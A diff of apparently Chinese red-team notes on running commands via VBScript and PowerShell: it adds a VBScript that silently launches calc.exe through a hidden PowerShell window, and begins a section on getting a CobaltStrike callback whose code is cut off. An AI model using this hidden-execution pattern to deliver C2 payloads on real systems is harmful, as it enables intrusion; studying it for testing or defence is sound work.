@@ -42,9 +42,21 @@
 
 ---
 
-## VBS + Powershell命令上线C2
+## VBS + Powershell
 
-例如:
+弹计算器
+
+```vbscript
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run "powershell -c calc.exe", 0, true
+```
+
+![image-20240712170149540](http://cdn.ayusummer233.top/DailyNotes/202407121701650.png)
+
+---
+
+上线 CobaltStrike:
 
 ```vbscript
 Dim var_shell
